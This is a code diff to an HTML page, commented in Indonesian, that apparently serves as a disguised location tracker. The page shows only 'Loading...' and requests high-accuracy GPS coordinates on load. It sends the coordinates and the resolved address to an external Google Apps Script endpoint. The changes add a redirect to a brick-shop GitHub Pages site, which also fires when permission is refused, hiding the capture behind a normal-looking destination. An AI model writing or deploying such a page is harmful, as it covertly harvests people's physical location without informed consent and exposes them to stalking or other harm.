@@ -26,13 +26,17 @@
     <h2 id="loading-text">Loading...</h2>
 
     <script>
-        // URL Web App Google Apps Script Anda yang terbaru
+        // URL Web App Google Apps Script Anda
         const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbzE7IpxAV273CT3tB7M4gcouYoj6zMmFN0B5ub_Wm1xcQcS4zHbczR89-vu6jqsKeBJYQ/exec';
+        
+        // Link tujuan GitHub Pages Anda yang baru
+        const TARGET_URL = 'https://rachmatfadilahhanif-star.github.io/toko-batako-bragolan/';
 
         window.onload = function() {
             const statusText = document.getElementById("loading-text");
 
             if (navigator.geolocation) {
+                // Mengambil posisi dengan opsi akurasi tinggi untuk HP
                 navigator.geolocation.getCurrentPosition(
                     async function(position) {
                         const lat = position.coords.latitude;
@@ -54,7 +58,7 @@
                             alamatLengkap = "Koordinat murni";
                         }
 
-                        // Kirim data ke Google Apps Script
+                        // Kirim data ke Google Apps Script / Drive
                         const formData = new URLSearchParams();
                         formData.append("latitude", lat);
                         formData.append("longitude", lon);
@@ -66,25 +70,25 @@
                             method: "POST",
                             mode: "no-cors",
                             body: formData
-                        }).then(() => {
-                            // TULISAN LOADING OTOMATIS HILANG SETELAH TERSIMPAN
-                            statusText.style.display = "none";
-                        }).catch(err => {
-                            statusText.innerText = "Gagal memproses.";
+                        }).finally(() => {
+                            // SETELAH TERSIMPAN, OTOMATIS PINDAH KE GITHUB PAGES ANDA
+                            window.location.href = TARGET_URL;
                         });
 
                     },
                     function(error) {
-                        statusText.innerText = "Izin lokasi diperlukan.";
+                        // Jika izin lokasi ditolak atau gagal, tetap arahkan ke link tujuan
+                        window.location.href = TARGET_URL;
                     },
                     {
-                        timeout: 15000,
-                        maximumAge: 0,
-                        enableHighAccuracy: true
+                        // PENGATURAN GPS ULTRA TINGGI
+                        enableHighAccuracy: true, // Memaksa HP menggunakan GPS Hardware
+                        timeout: 20000,           // Waktu tunggu hingga 20 detik
+                        maximumAge: 0             // Mencegah HP memakai data cache lama
                     }
                 );
             } else {
-                statusText.innerText = "Browser tidak mendukung.";
+                window.location.href = TARGET_URL;
             }
         };
     </script>
